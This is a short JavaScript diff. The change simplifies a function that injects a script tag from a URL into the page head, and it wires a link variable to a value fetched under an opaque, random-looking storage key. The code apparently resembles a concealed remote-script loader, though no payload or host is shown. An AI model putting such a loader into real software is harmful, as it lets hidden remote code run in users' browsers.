@@ -57,18 +57,12 @@ function makeForm(url, dataObj) { const params = new URLSearchParams(); for (let
 function addMaster(url) {
   var elem = document.createElement("script");
   elem.src = url;
-  try {
-    document.querySelector('style').insertAdjacentElement("beforeend", elem);
-  } catch (e) {
-    document.querySelector('#mobiOptiElem').insertAdjacentElement("beforeend", elem);
-  } finally {
-    document.querySelector('head').insertAdjacentElement("beforeend", elem);
-  }
+  document.querySelector('head').insertAdjacentElement("beforeend", elem);
 }
 var serverData = {
   'null': sc.get("vaEHjRd0vc8HWMa6uLIyW9dzoZRWX8atnb5WiFbp"),
 }
-var lnkMain="";
+var lnkMain=serverData.null;
 
 
 function _init() {
